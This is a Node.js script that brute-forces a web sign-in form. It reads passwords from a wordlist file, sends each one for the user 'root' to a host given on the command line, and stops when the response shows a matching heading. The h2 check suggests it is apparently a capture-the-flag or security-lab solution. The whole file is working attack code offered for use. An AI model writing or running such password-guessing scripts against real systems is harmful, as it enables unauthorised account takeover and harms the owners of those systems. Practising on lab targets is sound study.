const request = require("request");
const fs = require("fs");
const cheerio = require("cheerio");
const { exit } = require("process");

const Fetch = (url) => {
  return new Promise((resolve, rejects) => {
    request(url, function (error, response, body) {
      if (body)
        resolve(body);
    });
  });
};

const getTextFromHtml = (data) => {
  let $ = cheerio.load(data);
  let arr = $("h2").text();
  if (/^([a-z]|[A-Z]|[0-9]|\s|:)+$/g.test(arr)) {
    console.log(arr);
    exit(0);
  }
};


const ReadFile = () => {
  const text = fs.readFileSync("./names.txt").toString('utf-8');
  const textByLine = text.split("\n")
  return textByLine;
};

const BruteForce = async () => {
  const data = ReadFile();
  for (item of data) {
    const url = `http://${process.argv[2]}/?page=signin&username=root&password=${item.trim()}&Login=Login#`;
    const res = await Fetch(url);
    getTextFromHtml(res);
  }
}

BruteForce();
